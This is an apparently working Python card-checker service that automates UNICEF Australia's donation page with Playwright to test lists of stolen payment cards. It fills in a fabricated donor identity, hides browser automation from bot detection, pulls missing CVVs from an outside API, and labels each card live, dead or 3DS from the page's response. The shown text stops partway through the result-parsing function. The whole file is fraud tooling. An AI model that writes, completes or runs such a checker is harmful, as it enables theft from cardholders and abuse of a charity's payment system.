import os
import re
import time
import base64
import logging
import threading
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

# ============================================================
# CONFIGURACIÓN
# ============================================================
HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
UNICEF_URL = os.environ.get('UNICEF_URL', 'https://www.unicef.org.au/donate')
DONATION_AMOUNT = float(os.environ.get('DONATION_AMOUNT', '10'))

CVV_API_URL = os.environ.get('CVV_API_URL', '')
CVV_API_KEY = os.environ.get('CVV_API_KEY', '')
CVV_API_TIMEOUT = int(os.environ.get('CVV_API_TIMEOUT', '20'))

DONOR_FIRST_NAME = os.environ.get('DONOR_FIRST_NAME', 'John')
DONOR_LAST_NAME  = os.environ.get('DONOR_LAST_NAME', 'Smith')
DONOR_EMAIL      = os.environ.get('DONOR_EMAIL', 'johnsmith439@gmail.com')
DONOR_PHONE      = os.environ.get('DONOR_PHONE', '19383728384')
DONOR_ADDRESS    = os.environ.get(
    'DONOR_ADDRESS',
    '233 Kurrajong Rd, Prestons NSW 2170, Australia'
)

ZIP_CODE = os.environ.get('ZIP_CODE', '10001')
MAX_RETRIES_PER_CARD = int(os.environ.get('MAX_RETRIES_PER_CARD', '1'))  # default 1 = sin reintento

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

checking_status = {
    'active': False, 'processed': 0, 'live': 0, 'decline': 0,
    'threeds': 0, 'error': 0, 'current': '', 'results': [],
    'thread': None, 'stop_on_live': False,
}


# ============================================================
# CHECKER
# ============================================================
class UnicefChecker:
    def __init__(self, headless=True):
        self.url = UNICEF_URL
        self.headless = headless
        self.donor = {
            'first_name': DONOR_FIRST_NAME,
            'last_name':  DONOR_LAST_NAME,
            'email':      DONOR_EMAIL,
            'phone':      DONOR_PHONE,
            'address':    DONOR_ADDRESS,
        }
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
        self.card_ctx = None
        self.session_ready = False
        self.current_amount = None

    # ---------------- utilidades ----------------
    def parse_card_data(self, card_string):
        try:
            parts = card_string.strip().split('|')
            if len(parts) < 4:
                raise ValueError("Formato inválido")
            return {
                'numero': parts[0].strip().replace(' ', '').replace('-', ''),
                'mes':    parts[1].strip().zfill(2),
                'ano':    parts[2].strip()[-2:],
                'cvv':    parts[3].strip(),
            }
        except Exception as e:
            logger.error(f"Error parseando tarjeta: {e}")
            return None

    def fetch_cvv(self, card_number, expiry):
        if not CVV_API_URL:
            return None
        try:
            headers = {'Content-Type': 'application/json'}
            if CVV_API_KEY:
                headers['Authorization'] = f'Bearer {CVV_API_KEY}'
                headers['X-API-Key'] = CVV_API_KEY
            payload = {
                'card_number': card_number, 'number': card_number,
                'expiry': expiry,
                'month': expiry.split('/')[0] if '/' in expiry else expiry[:2],
                'year':  expiry.split('/')[1] if '/' in expiry else expiry[2:],
            }
            r = requests.post(CVV_API_URL, json=payload, headers=headers, timeout=CVV_API_TIMEOUT)
            if r.status_code != 200:
                return None
            data = r.json()
            if isinstance(data, dict):
                for key in ('cvv', 'cvc', 'code', 'cvv2', 'security_code'):
                    if key in data and data[key]:
                        v = data[key]
                        if isinstance(v, dict):
                            for k2 in ('cvv', 'cvc', 'code'):
                                if k2 in v:
                                    return str(v[k2]).zfill(3)
                        else:
                            return str(v).zfill(3)
            return None
        except Exception as e:
            logger.error(f"Error API CVV: {e}")
            return None

    def _screenshot(self, tag):
        """Toma screenshot con nombre único y devuelve base64 (opcional)."""
        try:
            if self.page:
                path = f'debug_psicodelia_{tag}.png'
                self.page.screenshot(path=path, full_page=True)
                logger.info(f"📸 Screenshot guardado: {path}")
                return path
        except Exception as e:
            logger.warning(f"Screenshot {tag} falló: {e}")
        return None

    def _screenshot_b64(self):
        """Devuelve screenshot en base64."""
        try:
            if self.page:
                return base64.b64encode(
                    self.page.screenshot(full_page=True)
                ).decode('utf-8')
        except Exception:
            pass
        return None

    def _click_first_visible(self, page, selector, timeout=15, desc=""):
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                loc = page.locator(selector).first
                if loc.count() > 0 and loc.is_visible() and loc.is_enabled():
                    loc.click(timeout=3000)
                    if desc:
                        logger.info(f"✅ {desc}")
                    return True
            except Exception:
                pass
            time.sleep(0.3)
        return False

    def _dismiss_overlays(self, page):
        for sel in [
            'button:has-text("Accept all")', 'button:has-text("Accept All")',
            'button:has-text("Accept")',    'button:has-text("Aceptar")',
            'button:has-text("I agree")',   '[aria-label="Close"]',
        ]:
            try:
                loc = page.locator(sel).first
                if loc.count() > 0 and loc.is_visible():
                    loc.click(timeout=1500)
                    time.sleep(0.4)
            except Exception:
                pass

    def _is_card_section_open(self, page):
        try:
            if page.locator('#payment-numberInput').count() > 0:
                return True
        except Exception:
            pass
        for frame in page.frames:
            try:
                if frame.locator('#payment-numberInput').count() > 0:
                    return True
            except Exception:
                continue
        return False

    # ============================================================
    # ZIP CODE (necesario porque el server corre en USA)
    # ============================================================
    def _fill_zip_code(self, ctx, verbose=False):
        selectors = [
            '#payment-postalInput',
            'input[name="postal"]',
            'input[name="postalCode"]',
            'input[name="zip"]',
            'input[name="zipCode"]',
            'input[autocomplete="postal-code"]',
            'input[placeholder*="ZIP" i]',
            'input[placeholder*="Postal" i]',
            'input[aria-label*="ZIP" i]',
            'input[aria-label*="Postal" i]',
        ]
        for sel in selectors:
            try:
                loc = ctx.locator(sel).first
                if loc.count() > 0 and loc.is_visible():
                    try:
                        current = loc.input_value()
                    except Exception:
                        current = ''
                    if current == ZIP_CODE:
                        if verbose:
                            logger.info(f"📮 ZIP ya estaba: {ZIP_CODE}")
                        return True
                    loc.click(timeout=3000); time.sleep(0.1)
                    try:
                        loc.fill('')
                    except Exception:
                        loc.press('Control+A'); loc.press('Delete')
                    time.sleep(0.1)
                    loc.fill(ZIP_CODE); time.sleep(0.3)
                    try:
                        loc.evaluate("""el => {
                            el.dispatchEvent(new Event('input',  {bubbles:true}));
                            el.dispatchEvent(new Event('change', {bubbles:true}));
                            el.dispatchEvent(new Event('blur',   {bubbles:true}));
                        }""")
                    except Exception:
                        pass
                    if verbose:
                        logger.info(f"📮 ZIP rellenado con {ZIP_CODE} vía {sel}")
                    return True
            except Exception:
                continue
        if verbose:
            logger.info("ℹ️ No se encontró campo ZIP")
        return False

    # ---------------- pasos del flow ----------------
    def step_click_first_donate(self, page):
        loc = page.locator('span.btn-text:visible').filter(
            has_text=re.compile(r'^\s*Donate\s*$')
        ).first
        loc.wait_for(state='visible', timeout=25000)
        loc.click()
        time.sleep(2)

    def step_click_modal_donate(self, page):
        try:
            page.wait_for_selector('input[placeholder="Other amount"]', timeout=8000)
        except PlaywrightTimeout:
            pass

        for sel in [
            '[role="dialog"] span.btn-text', 'dialog span.btn-text',
            '.ReactModal__Content span.btn-text', '.modal span.btn-text',
        ]:
            try:
                loc = page.locator(sel).filter(
                    has_text=re.compile(r'^\s*Donate\s*$')
                ).first
                if loc.count() > 0 and loc.is_visible():
                    loc.click(timeout=4000)
                    time.sleep(2)
                    return
            except Exception:
                continue

        deadline = time.time() + 12
        while time.time() < deadline:
            try:
                btns = page.locator('span.btn-text:visible').filter(
                    has_text=re.compile(r'^\s*Donate\s*$')
                ).all()
                for b in reversed(btns):
                    try:
                        if b.is_visible():
                            b.click(timeout=3000)
                            time.sleep(2)
                            return
                    except Exception:
                        continue
            except Exception:
                pass
            time.sleep(0.4)
        raise Exception("No se encontró 'Donate' del modal")

    def step_set_amount(self, page, amount):
        field = page.locator('input[placeholder="Other amount"]').first
        if field.count() == 0:
            field = page.locator('input[id*="donation-other-amount"]').first
        field.wait_for(state='visible', timeout=15000)
        field.scroll_into_view_if_needed()
        field.click(); time.sleep(0.2)
        field.fill('');  time.sleep(0.2)
        field.fill(str(amount))
        field.evaluate("""el => {
            el.dispatchEvent(new Event('input',  {bubbles:true}));
            el.dispatchEvent(new Event('change', {bubbles:true}));
            el.dispatchEvent(new Event('blur',   {bubbles:true}));
        }""")
        time.sleep(0.5)

    def step_click_donate_now(self, page):
        loc = page.locator('span.btn-text:visible').filter(
            has_text=re.compile(r'^\s*Donate Now\s*$')
        ).first
        loc.wait_for(state='visible', timeout=15000)
        loc.click()
        time.sleep(3)

    def step_fill_personal_info(self, page):
        fn = page.locator('input[name="FirstName_0"]').first
        if fn.count() == 0:
            fn = page.locator('input[id="input-40"]').first
        fn.wait_for(state='visible', timeout=25000)
        fn.click(); fn.fill(self.donor['first_name']); time.sleep(0.3)

        ln = page.locator('input[name="LastName_0"]').first
        if ln.count() == 0:
            ln = page.locator('input[id="input-45"]').first
        ln.click(); ln.fill(self.donor['last_name']); time.sleep(0.3)

        em = page.locator('input[name="Email"]').first
        if em.count() == 0:
            em = page.locator('input[id="input-55"]').first
        em.click(); em.fill(self.donor['email']); time.sleep(0.3)

        ph = page.locator('input[type="tel"]').first
        if ph.count() == 0:
            ph = page.locator('input[id="input-58"]').first
        ph.click(); ph.fill(self.donor['phone']); time.sleep(0.4)

    def step_click_continue(self, page, label="Continue"):
        ok = self._click_first_visible(
            page, f'button:has-text("{label}"):visible',
            timeout=20, desc=f"'{label}'"
        )
        if not ok:
            self._click_first_visible(
                page, f'lightning-button:has-text("{label}") button:visible',
                timeout=5
            )
        time.sleep(2)

    def step_fill_address(self, page):
        field = page.locator('input[placeholder="Search for Address..."]').first
        if field.count() == 0:
            field = page.locator('input[name="location"]').first
        field.wait_for(state='visible', timeout=20000)
        field.click(); time.sleep(0.3)
        field.fill('')
        field.type(self.donor['address'], delay=60)
        time.sleep(3)

        clicked = False
        deadline = time.time() + 12
        keywords = [self.donor['address'], 'Kurrajong', 'Prestons', '233 Kurrajong']
        while time.time() < deadline and not clicked:
            for kw in keywords:
                cands = [
                    page.locator(
                        f'div[class*="slds-p-horizontal_x-small"][class*="slds-p-vertical_xx-small"]:has-text("{kw}")'
                    ).first,
                    page.locator(f'[role="option"]:has-text("{kw}")').first,
                    page.locator(f'li:has-text("{kw}")').first,
                ]
                for c in cands:
                    try:
                        if c.count() > 0 and c.is_visible():
                            c.click(timeout=3000)
                            clicked = True
                            break
                    except Exception:
                        continue
                if clicked:
                    break
            if not clicked:
                time.sleep(0.5)
        if not clicked:
            page.keyboard.press('Tab')
        time.sleep(2)

    def step_open_card_section(self, page):
        logger.info("💳 Esperando 15s de carga...")
        time.sleep(15)
        if self._is_card_section_open(page):
            logger.info("✅ Card abierta")
            return True

        logger.info("⌨️  Tab x4 + Space")
        try:
            for _ in range(4):
                page.keyboard.press('Tab')
                time.sleep(0.2)
            page.keyboard.press('Space')
            time.sleep(5)
        except Exception as e:
            logger.warning(f"Tab+Space falló: {e}")

        if self._is_card_section_open(page):
            logger.info("✅ Card abierta")
            return True

        time.sleep(5)
        return self._is_card_section_open(page)

    # ============================================================
    # SESIÓN PERSISTENTE
    # ============================================================
    def _ensure_session(self, amount):
        if self.session_ready and self.page and not self.page.is_closed():
            if self._is_card_section_open(self.page):
                return True
            logger.info("🔄 Página cambió, reiniciando flow")
            self._teardown_session()

        self._teardown_session()
        try:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(
                headless=self.headless,
                args=['--no-sandbox', '--disable-setuid-sandbox',
                      '--disable-dev-shm-usage',
                      '--disable-blink-features=AutomationControlled'],
            )
            self.context = self.browser.new_context(
                viewport={'width': 1366, 'height': 900},
                user_agent=('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                            'AppleWebKit/537.36 (KHTML, like Gecko) '
                            'Chrome/122.0.0.0 Safari/537.36'),
            )
            self.page = self.context.new_page()

            logger.info(f"🌐 Navegando a {self.url}")
            self.page.goto(self.url, timeout=45000, wait_until='domcontentloaded')
            time.sleep(3)
            self._dismiss_overlays(self.page)

            self.step_click_first_donate(self.page)
            self.step_click_modal_donate(self.page)
            self.step_set_amount(self.page, amount)
            self.step_click_donate_now(self.page)

            self.step_fill_personal_info(self.page)
            self.step_click_continue(self.page)
            self.step_fill_address(self.page)
            self.step_click_continue(self.page)

            opened = self.step_open_card_section(self.page)
            if not opened:
                logger.error("❌ No se pudo abrir 'Card'")
                self._teardown_session()
                return False

            self.current_amount = amount
            self.session_ready = True
            logger.info("✅ Sesión lista para ingresar tarjeta")
            return True
        except Exception as e:
            logger.exception(f"Error creando sesión: {e}")
            self._teardown_session()
            return False

    def _teardown_session(self):
        try:
            if self.page: self.page.close()
        except Exception: pass
        try:
            if self.browser: self.browser.close()
        except Exception: pass
        try:
            if self.playwright: self.playwright.stop()
        except Exception: pass
        self.page = None
        self.context = None
        self.browser = None
        self.playwright = None
        self.card_ctx = None
        self.session_ready = False
        self.current_amount = None

    def _find_card_context(self):
        if self.session_ready and self.card_ctx is not None:
            try:
                if self.card_ctx.locator('#payment-numberInput').count() > 0:
                    return self.card_ctx
            except Exception:
                pass
        try:
            if self.page.locator('#payment-numberInput').count() > 0:
                self.card_ctx = self.page
                return self.page
        except Exception:
            pass
        for frame in self.page.frames:
            try:
                if frame.locator('#payment-numberInput').count() > 0:
                    self.card_ctx = frame
                    return frame
            except Exception:
                continue
        return None

    def _clear_card_fields(self, ctx):
        for sel in ['#payment-numberInput', '#payment-expiryInput', '#payment-cvcInput']:
            try:
                loc = ctx.locator(sel).first
                if loc.count() > 0:
                    loc.click(timeout=3000)
                    time.sleep(0.15)
                    loc.fill('')
                    time.sleep(0.15)
            except Exception:
                pass

    def _fill_card_fields(self, ctx, card_info):
        num = ctx.locator('#payment-numberInput').first
        num.wait_for(state='visible', timeout=15000)
        num.click(); time.sleep(0.2)
        num.fill(card_info['numero']); time.sleep(0.6)

        exp = ctx.locator('#payment-expiryInput').first
        exp.click(); time.sleep(0.2)
        exp.fill(f"{card_info['mes']} / {card_info['ano']}"); time.sleep(0.6)

        cvc = ctx.locator('#payment-cvcInput').first
        cvc.click(); time.sleep(0.2)
        cvc.fill(card_info['cvv']); time.sleep(0.6)

        zip_ok = self._fill_zip_code(ctx, verbose=True)

        try:
            cvc.press('Tab'); time.sleep(1.0)
        except Exception:
            pass

        try:
            logger.info(f"📋 num='{num.input_value()}' exp='{exp.input_value()}' "
                        f"cvc='{cvc.input_value()}' zip_ok={zip_ok}")
        except Exception:
            pass

    # ============================================================
    # LOCALIZAR BOTÓN
    # ============================================================
    def _resolve_clickable(self, span):
        if span is None:
            return None
        try:
            for xp in [
                'xpath=ancestor::button[1]',
                'xpath=ancestor::*[@role="button"][1]',
                'xpath=ancestor::a[1]',
                'xpath=..',
            ]:
                try:
                    c = span.locator(xp).first
                    if c.count() > 0:
                        return c
                except Exception:
                    pass
        except Exception:
            pass
        return span

    def _locate_process_payment(self):
        contexts = []
        if self.card_ctx is not None:
            contexts.append(self.card_ctx)
        if self.page is not None:
            contexts.append(self.page)
        for f in self.page.frames:
            if not any(f is c for c in contexts):
                contexts.append(f)

        for c in contexts:
            try:
                span = c.locator('#button-text').first
                if span.count() > 0:
                    try:
                        txt = span.inner_text().strip()
                    except Exception:
                        txt = ''
                    if 'process' in txt.lower() or txt == '':
                        btn = self._resolve_clickable(span)
                        ctx_url = getattr(c, 'url', 'main')[:70]
                        logger.info(f"📍 #button-text en [{ctx_url}] — '{txt}'")
                        return c, span, btn
            except Exception:
                pass

        for c in contexts:
            try:
                btn = c.locator('button:has-text("Process Payment")').first
                if btn.count() > 0:
                    return c, None, btn
            except Exception:
                pass
        return None, None, None

    # ============================================================
    # SNAPSHOT Y DETECCIÓN
    # ============================================================
    def _snapshot_errors(self):
        snapshot = set()
        error_sel = (
            '[role="alert"], [aria-live="polite"], [aria-live="assertive"], '
            '[class*="ErrorText" i], [class*="error-message" i], '
            '[class*="FieldError" i], [class*="ErrorMessage" i], '
            '[class*="PaymentError" i], [class*="payment-error" i], '
            '[class*="Alert" i], [class*="Notification" i], '
            '.p-FieldError, .p-Input-Error, .p-FieldError-ErrorText'
        )
        for c in [self.page] + list(self.page.frames):
            try:
                n = c.locator(error_sel).count()
                for i in range(min(n, 15)):
                    try:
                        el = c.locator(error_sel).nth(i)
                        if el.is_visible():
                            t = el.inner_text().strip()
                            if t:
                                snapshot.add(t.lower()[:300])
                    except Exception:
                        pass
            except Exception:
                pass
        return snapshot

    def _dump_error_texts(self):
        """Devuelve lista de errores visibles (para log)."""
        errors = []
        error_sel = (
            '[role="alert"], [aria-live="polite"], [aria-live="assertive"], '
            '[class*="ErrorText" i], [class*="error-message" i], '
            '[class*="FieldError" i], [class*="ErrorMessage" i], '
            '[class*="PaymentError" i], [class*="payment-error" i], '
            '.p-FieldError, .p-Input-Error, .p-FieldError-ErrorText'
        )
        for c in [self.page] + list(self.page.frames):
            try:
                n = c.locator(error_sel).count()
                for i in range(min(n, 20)):
                    try:
                        el = c.locator(error_sel).nth(i)
                        if el.is_visible():
                            t = el.inner_text().strip()
                            if t and len(t) > 2:
                                errors.append(t[:200])
                    except Exception:
                        pass
            except Exception:
                pass
        return errors

    def _get_btn_text(self, span):
        try:
            if span is not None and span.count() > 0 and span.is_visible():
                return span.inner_text().strip().lower()
        except Exception:
            pass
        return ''

    def _get_btn_disabled(self, span):
        try:
            if span is not None:
                for xp in ['xpath=ancestor::button[1]',
                           'xpath=ancestor::*[@role="button"][1]',
                           'xpath=..']:
                    try:
                        b = span.locator(xp).first
                        if b.count() > 0:
                            if b.get_attribute('disabled') is not None:
                                return True
                            if b.get_attribute('aria-disabled') == 'true':
                                return True
                            if b.get_attribute('aria-busy') == 'true':
                                return True
                    except Exception:
                        pass
        except Exception:
            pass
        return False

    def _check_new_decline(self, pre_snapshot):
        curr = self._snapshot_errors()
        new_items = curr - pre_snapshot
        if not new_items:
            return False
        dead_kw = (
            'declin', 'rechaz', 'reject', 'not authorized', 'not authorised',
            'no autoriz', 'do not honor', 'do not honour', 'insufficient',
            'insuficien', 'expired', 'expir', 'vencid', 'incorrect', 'invalid',
            'failed', 'falló', 'fallo', 'no se pudo', 'could not process',
            'unable to process', 'error de pago', 'pago fall',
        )
        for item in new_items:
            if 'zip' in item or 'postal' in item or 'postcode' in item:
                continue
            if any(k in item for k in dead_kw):
                logger.info(f"🆕 Error NUEVO: '{item[:150]}'")
                return True
        return False

    def _check_live(self):
        try:
            url = self.page.url.lower()
            if any(k in url for k in ('thank-you', 'thankyou', 'thank_you',
                                      '/success', '/confirmation', '/receipt')):
                return True
        except Exception:
            pass
        return False

    def _mouse_click_locator(self, locator):
        try:
            try:
                locator.scroll_into_view_if_needed(timeout=3000)
                time.sleep(0.3)
            except Exception:
                pass
            box = locator.bounding_box()
            if box and box['width'] > 0 and box['height'] > 0:
                x = box['x'] + box['width'] / 2
                y = box['y'] + box['height'] / 2
                logger.info(f"      mouse.click({x:.0f},{y:.0f})")
                self.page.mouse.move(x, y); time.sleep(0.2)
                self.page.mouse.click(x, y)
                return True
        except Exception as e:
            logger.info(f"      mouse.click falló: {e}")
        return False

    # ============================================================
    # CLICK — polling robusto con captura obligatoria
    # ============================================================
    def _click_process_payment_and_wait(self):
        found_ctx, span, btn = self._locate_process_payment()
        if found_ctx is None:
            logger.error("❌ 'Process Payment' no encontrado")
            return 'unknown'

        if btn is None:
            btn = span
        target = btn if btn is not None else span

        # ---- Loguear errores preexistentes ----
        pre_errs = self._dump_error_texts()
        if pre_errs:
            logger.info(f"⚠️ Errores PREEXISTENTES ({len(pre_errs)}):")
            for i, e in enumerate(pre_errs[:10]):
                logger.info(f"   {i+1}. {e[:180]}")
        else:
            logger.info("✅ Sin errores preexistentes en el DOM")

        # ---- Pre-outcome para saber si la página ya está en decline ----
        pre_outcome = self.analyze_payment_result(self.page)
        logger.info(f"🔍 Pre-outcome: '{pre_outcome}'")

        # ---- Screenshot ANTES ----
        self._screenshot("01_before_click")

        # ---- ZIP si botón disabled ----
        ctx_for_zip = self._find_card_context()
        if self._get_btn_disabled(span) and ctx_for_zip:
            logger.info("🔧 Botón disabled → re-llenando ZIP")
            self._fill_zip_code(ctx_for_zip, verbose=True)
            time.sleep(1)

        pre_errors = self._snapshot_errors()
        pre_btn_text = self._get_btn_text(span)
        pre_btn_disabled = self._get_btn_disabled(span)
        logger.info(f"🔍 [SNAPSHOT] pre_text='{pre_btn_text}' pre_disabled={pre_btn_disabled} "
                    f"pre_errors={len(pre_errors)}")

        # ---- CLICK PRINCIPAL ----
        logger.info("🖱️  CLICK principal: mouse_click_bbox")
        clicked = False
        try:
            clicked = self._mouse_click_locator(target)
        except Exception as e:
            logger.warning(f"Mouse click falló: {e}")
        if not clicked and btn is not None:
            try:
                btn.click(force=True, timeout=5000)
                clicked = True
                logger.info("🖱️  Fallback: btn.click(force=True)")
            except Exception as e:
                logger.warning(f"btn.click falló: {e}")

        if not clicked:
            logger.error("❌ No se pudo ejecutar el click")
            self._screenshot("02_click_failed")
            return 'unknown'

        time.sleep(2)
        self._screenshot("03_after_click_2s")

        # ---- POLLING 45s ----
        logger.info("⏳ Polling resultado (45s max)...")
        start = time.time()
        detected = None
        for i in range(90):  # 45s a 0.5s
            time.sleep(0.5)
            elapsed = int(time.time() - start)

            # 1) Error nuevo
            if self._check_new_decline(pre_errors):
                detected = 'decline'
                logger.info(f"📊 [{elapsed}s] decline (error nuevo)")
                break

            # 2) analyze_payment_result (si cambió respecto al pre_outcome)
            curr_outcome = self.analyze_payment_result(self.page)
            if curr_outcome in ('decline', 'live', 'threeds') and curr_outcome != pre_outcome:
                detected = curr_outcome
                logger.info(f"📊 [{elapsed}s] {curr_outcome} (analyze)")
                break

            # 3) URL live
            if self._check_live():
                detected = 'live'
                logger.info(f"📊 [{elapsed}s] live (URL)")
                break

            # 4) Botón cambió → sigue esperando con más tiempo
            curr_text = self._get_btn_text(span)
            curr_disabled = self._get_btn_disabled(span)
            if (curr_text and 'process payment' not in curr_text) or \
               (not pre_btn_disabled and curr_disabled) or \
               (curr_text == '' and pre_btn_text != ''):
                logger.info(f"📊 [{elapsed}s] botón cambió ('{curr_text}' disabled={curr_disabled}) "
                            f"→ sigue polling con más tiempo")
                # No break, seguir esperando resultado real

            # 5) ZIP retry cada 4s
            if ctx_for_zip and i > 0 and i % 8 == 0:
                try:
                    self._fill_zip_code(ctx_for_zip, verbose=False)
                except Exception:
                    pass

            # 6) Log progreso cada 6s
            if elapsed > 0 and elapsed % 6 == 0 and i % 12 == 0:
                logger.info(f"⏳ [{elapsed}s] esperando... url={self.page.url[:60]}")

        # ---- RESULTADO ----
        if not detected:
            logger.warning(f"❌ Sin resultado tras 45s → unknown")
            self._screenshot("99_unknown_final")

            # Captura final + dump
            post_errs = self._dump_error_texts()
            if post_errs:
                logger.warning(f"⚠️ Errores visibles al final ({len(post_errs)}):")
                for i, e in enumerate(post_errs[:10]):
                    logger.warning(f"   {i+1}. {e[:180]}")

            post_outcome = self.analyze_payment_result(self.page)
            logger.warning(f"⚠️ Post-outcome final: '{post_outcome}'")
            logger.warning(f"⚠️ URL final: {self.page.url}")

            self._dump_debug()
            return 'unknown'

        logger.info(f"✅ Resultado detectado: {detected}")
        self._screenshot(f"04_result_{detected}")
        return detected

    def _dump_debug(self):
        logger.warning("════════════ DEBUG DUMP ════════════")
        for i, c in enumerate([self.page] + list(self.page.frames)):
            try:
                url = getattr(c, 'url', 'unknown')[:100]
                spans = c.locator('#button-text').all()
                buttons = c.locator('button').all()
                zip_sel = c.locator('#payment-postalInput, input[name="postal"], input[name="postalCode"], input[autocomplete="postal-code"]')
                zip_count = zip_sel.count()
                zip_val = ''
                if zip_count > 0:
                    try:
                        zip_val = zip_sel.first.input_value()
                    except Exception:
                        pass
                logger.warning(f"[ctx {i}] url={url} | #button-text={len(spans)} | "
                               f"buttons={len(buttons)} | zip_count={zip_count} zip_val='{zip_val}'")
                for j, s in enumerate(spans[:3]):
                    try:
                        t = s.inner_text().strip()[:40]
                        v = s.is_visible()
                        bb = s.bounding_box()
                        logger.warning(f"    span[{j}]: text='{t}' visible={v} bbox={bb}")
                    except Exception as e:
                        logger.warning(f"    span[{j}]: err {e}")
            except Exception as e:
                logger.warning(f"[ctx {i}] err: {e}")
        logger.warning("════════════════════════════════════")

    # ============================================================
    # CHEQUEO DE UNA TARJETA
    # ============================================================
    def check_card_in_session(self, card_string, amount=None):
        amount = amount or DONATION_AMOUNT
        card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
        logger.info(f"🚀 Verificando ****{card_last4} (${amount})")

        card_info = self.parse_card_data(card_string)
        if not card_info:
            return {'success': False, 'status': 'ERROR',
                    'message': 'Formato inválido', 'card': f"****{card_last4}"}

        expiry_str = f"{card_info['mes']}/{card_info['ano']}"
        api_cvv = self.fetch_cvv(card_info['numero'], expiry_str)
        if api_cvv:
            logger.info(f"✅ CVV vía API: {api_cvv}")
            card_info['cvv'] = api_cvv

        max_attempts = MAX_RETRIES_PER_CARD
        for attempt in range(max_attempts):
            if attempt > 0:
                logger.info(f"🔄 Reintento {attempt}/{max_attempts-1} de ****{card_last4}")
                self._teardown_session()

            if not self._ensure_session(amount):
                logger.error(f"❌ No se pudo crear sesión (intento {attempt+1})")
                continue

            ctx = self._find_card_context()
            if not ctx:
                logger.error(f"❌ Sin card context (intento {attempt+1})")
                self._teardown_session()
                continue

            try:
                self._clear_card_fields(ctx)
                time.sleep(0.3)
                self._fill_card_fields(ctx, card_info)
            except Exception as e:
                logger.error(f"❌ Fill falló: {e}")
                self._teardown_session()
                continue

            if ctx.locator('#payment-numberInput').count() == 0:
                logger.error("❌ Card form desapareció")
                self._teardown_session()
                continue

            outcome = self._click_process_payment_and_wait()

            # Tomar screenshot base64 SIEMPRE (incluso unknown)
            screenshot_b64 = self._screenshot_b64()

            if outcome == 'live':
                self._teardown_session()
                return self._build_result(card_last4, 'LIVE', amount, api_cvv, outcome, screenshot_b64)
            if outcome == 'decline':
                logger.info(f"✅ DECLINE — sesión se mantiene")
                return self._build_result(card_last4, 'DEAD', amount, api_cvv, outcome, screenshot_b64)
            if outcome == 'threeds':
                self._teardown_session()
                return self._build_result(card_last4, '3DS', amount, api_cvv, outcome, screenshot_b64)

            logger.warning(f"⚠️ Unknown en intento {attempt+1} — retornando con captura")
            self._teardown_session()
            return self._build_result(card_last4, 'ERROR', amount, api_cvv, outcome, screenshot_b64)

        return {'success': False, 'status': 'ERROR',
                'message': 'Unknown outcome',
                'card': f"****{card_last4}"}

    def _build_result(self, last4, status, amount, api_cvv, raw_outcome, screenshot_b64=None):
        if screenshot_b64 is None:
            screenshot_b64 = self._screenshot_b64()
        return {
            'success': status != 'ERROR', 'status': status,
            'original_status': f"Resultado: {raw_outcome}",
            'message': f"Análisis completado para ****{last4}",
            'card': f"****{last4}",
            'gate': 'UNICEF AU', 'amount': amount,
            'response': {
                'url': self.page.url if self.page else '',
                'screenshot': screenshot_b64,
                'timestamp': datetime.now().isoformat(),
                'cvv_from_api': bool(api_cvv),
            },
        }

    # ---------------- análisis de resultado ----------------
    def analyze_payment_result(self, page):
        text_parts = []
        try:
            text_parts.append(page.locator('body').inner_text())
        except Exception:
            try:
                text_parts.append(page.content())
            except Exception:
                pass
        for frame in page.frames:
            try:
                text_parts.append(frame.locator('body').inner_text())
            except Exception:
                try:
                    text_parts.append(frame.content())
                except Exception:
                    pass

        all_text = re.sub(r'\s+', ' ', ' '.join(text_parts)).lower()
        url = page.url.lower()

        live_phrases = [
            'thank you for your donation', 'thanks for your donation',
            'thank you for your generous', 'thank you so much for your donation',
            'thank you for donating', 'donation successful',
            'donation was successful', 'donation complete', 'donation confirmed',
            'your donation has been received', 'payment successful',
            'payment was successful', 'payment complete', 'payment was completed',
            'payment confirmed', 'successfully donated', 'transaction successful',
            'your payment was successful',
            'gracias por tu donación', 'gracias por su donación',
            'donación exitosa', 'donación completada', 'donación confirmada',
            'pago exitoso', 'pago completado', 'pago confirmado',
        ]
        if any(p in all_text for p in live_phrases):
            return 'live'
        if any(k in url for k in ('thank-you', 'thankyou', 'thank_you',
                                  '/success', '/confirmation', '/receipt')):
            return 'live'

        dead_phrases = [
            'your card was declined', 'your card has been declined',
            'your card is declined', 'the card was declined',
            'the transaction was declined', 'transaction was declined',
            'card was declined', 'card has been declined', 'card is declined',
            'payment declined', 'payment was declined',
            'transaction declined',
            'your card is not authorized', 'your card was not authorized',
            'card not authorised', 'card not authorized',
            'declined by the issuer', 'the card issuer declined', 'issuer declined',
            'do not honor', 'do not honour',
            'insufficient funds', 'insufficient balance',
            'your card has insufficient funds',
            'incorrect cvv', 'invalid cvv', 'invalid cvc', 'incorrect cvc',
            'security code is incorrect', 'security code is invalid',
            'cvv is incorrect', 'cvc is incorrect',
            'incorrect expiry', 'invalid expiry', 'expired card',
            'card has expired', 'card is expired',
            'expiration date is incorrect',
            'payment failed', 'payment was unsuccessful',
            'payment was not successful',
            'unable to process your payment', 'unable to process payment',
            'we were unable to process', 'could not process your payment',
            'payment could not be processed',
            'transaction failed', 'transaction was unsuccessful',
            'tarjeta rechazada', 'tarjeta fue rechazada', 'tarjeta ha sido rechazada',
            'su tarjeta fue rechazada', 'su tarjeta ha sido rechazada',
            'la tarjeta fue rechazada', 'la tarjeta ha sido rechazada',
            'pago rechazado', 'pago fue rechazado', 'el pago fue rechazado',
            'transacción rechazada', 'transaccion rechazada',
            'transacción fue rechazada', 'la transacción fue rechazada',
            'fondos insuficientes', 'saldo insuficiente',
            'tarjeta vencida', 'tarjeta expirada', 'tarjeta ha expirado',
            'código de seguridad incorrecto', 'codigo de seguridad incorrecto',
            'cvv incorrecto', 'cvc incorrecto',
            'fecha de vencimiento incorrecta', 'fecha de expiración incorrecta',
            'el pago no pudo ser procesado', 'no se pudo procesar el pago',
            'no pudimos procesar su pago', 'pago no autorizado',
        ]
        if any(p in all_text for p in dead_phrases):
